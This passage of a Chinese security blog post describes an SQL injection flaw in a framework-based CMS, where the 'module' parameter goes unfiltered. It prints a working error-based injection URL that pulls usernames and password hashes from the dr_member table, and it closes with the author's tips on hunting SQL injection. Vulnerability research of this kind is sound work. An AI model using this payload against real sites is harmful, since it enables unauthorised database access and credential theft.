</span></span><span style=display:flex><span>    $string <span style=color:#f92672>=</span> <span style=color:#a6e22e>str_replace</span>(<span style=color:#e6db74>&#39;&gt;&#39;</span>, <span style=color:#e6db74>&#39;&amp;gt;&#39;</span>, $string);
</span></span><span style=display:flex><span>    $string <span style=color:#f92672>=</span> <span style=color:#a6e22e>str_replace</span>(<span style=color:#e6db74>&#34;{&#34;</span>, <span style=color:#e6db74>&#39;&#39;</span>, $string);
</span></span><span style=display:flex><span>    $string <span style=color:#f92672>=</span> <span style=color:#a6e22e>str_replace</span>(<span style=color:#e6db74>&#39;}&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>, $string);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> $string;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>可见调用这个方法还是有用的，但是在官方代码中，<code>module</code>并没有过滤。</p><p>于是根据数据库结构构造EXP……</p><p><a href=https://images.payloads.online/e51ca6e8-4f5e-11ec-8327-00d861bf4abb.jpg data-fancybox=gallery data-caption=POC><img src=https://images.payloads.online/e51ca6e8-4f5e-11ec-8327-00d861bf4abb.jpg alt=POC></a></p><p><a href=https://images.payloads.online/e56c850a-4f5e-11ec-9e88-00d861bf4abb.jpg data-fancybox=gallery data-caption=POC><img src=https://images.payloads.online/e56c850a-4f5e-11ec-9e88-00d861bf4abb.jpg alt=POC></a></p><p><code>index.php?s=member&amp;c=account&amp;m=attachment&amp;module=&amp;ext=pa&amp;module=d%" and(select 1 from(select count(*),concat((select (select (SELECT distinct concat('[',username,0x3a,password,'] by Coralab') FROM dr_member limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) -- x</code></p><p>是不是看的很舒服？ 哈哈，这个基于框架的CMS漏洞还是很多的，抽空继续看，下班了、</p><h2 id=0x04-总结>0x04 总结</h2><p>框架中有很多过滤方法，但是开发人员并没有调用它们，虽说Module和Controller分开写没错，但是这个CMS目录结构很散，要不是我之前开发过漏洞平台，也许是看不懂它的加载的……没错，我现在也看不懂。挖掘SQL注入我主要是寻找数据库驱动，然后在query函数体内打印SQL语句，是不是很生猛？</p><p>后面有时间了继续总结~ 周五了，可以嗨了！</p></section><nav class="mt-24 flex overflow-hidden rounded-xl bg-black/[3%] text-lg leading-[1.2]! *:flex *:w-1/2 *:items-center *:p-5 *:font-medium *:no-underline dark:bg-white/[8%] [&>*:hover]:bg-black/[2%] dark:[&>*:hover]:bg-white/[3%]"><a class="ltr:pr-3 rtl:pl-3" href=https://payloads.online/archivers/2017-08-21/1/><span class="ltr:mr-1.5 rtl:ml-1.5">←</span><span>Tomcat 开启 https支持</span></a><a class="justify-end pl-3 ltr:ml-auto rtl:mr-auto" href=https://payloads.online/archivers/2017-08-07/1/><span>Nmap扩展开发</span><span class="ltr:ml-1.5 rtl:mr-1.5">→</span></a></nav><div class="giscus mt-24"></div><script src=https://giscus.app/client.js data-repo=Rvn0xsy/rvn0xsy.github.io data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY=" data-category=General data-category-id=DIC_kwDOF-pTTM4CRDk_ data-mapping=title data-strict=1 data-reactions-enabled=0 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></article></main><script src=/js/fancybox.umd.js></script><script>Fancybox.bind('[data-fancybox="gallery"]',{})</script><script src=/js/pangu.min.js></script><script>document.addEventListener("DOMContentLoaded",()=>{pangu.spacingElementByClassName("prose")})</script><footer class="mx-auto flex h-[4.5rem] max-w-(--w) items-center px-8 text-xs tracking-wider uppercase opacity-60"><div class=mr-auto>倾旋 All rights reserved</div><a class="link mx-6" href=https://gohugo.io/ rel=noopener target=_blank>powered by hugo️️</a>️</footer></body></html>